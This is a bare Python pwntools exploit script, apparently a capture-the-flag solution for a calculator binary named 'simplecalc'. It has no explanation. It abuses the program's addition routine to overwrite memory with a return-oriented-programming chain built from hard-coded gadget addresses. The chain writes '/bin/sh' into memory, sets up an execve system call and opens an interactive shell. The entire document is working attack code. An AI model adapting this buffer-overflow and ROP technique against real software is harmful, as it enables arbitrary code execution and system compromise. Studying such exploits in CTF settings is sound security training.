from pwn import *
target = process("./simplecalc")
# gdb.attach(target, gdbscript = 'b *0x40154a')

Poprax = 0x44db34
Poprdx = 0x437a85
Poprdi = 0x401b73
Poprsi = 0x401c87
binSh = 0x0068732f6e69622f
Popsys = 0x400488
movGadget = 0x44526e

target.recvuntil(b"calculations: ")
target.sendline(b"100")

def addSingle(x):
	target.recvuntil(b"=>")
	target.sendline(b"1")
	target.recvuntil(b"x:")
	target.sendline(b"100")
	target.recvuntil(b"y:")
	target.sendline(str(x-100))
def add(z):
	x = z & 0xffffffff
	y = ((z & 0xfffffff00000000) >> 32)
	addSingle(x)
	addSingle(y)
for i in range(9):
	add(0x0)
add(Poprax)
add(0x6c1000)
add(Poprdx)
add(binSh)
add(movGadget)
add(movGadget)

add(Poprax)
add(0x3b)
add(Poprdi)
add(0x6c1000)
add(Poprsi)
add(0x0)
add(Poprdx)
add(0x0)

add(Popsys)

target.sendline(b"5")

target.interactive()


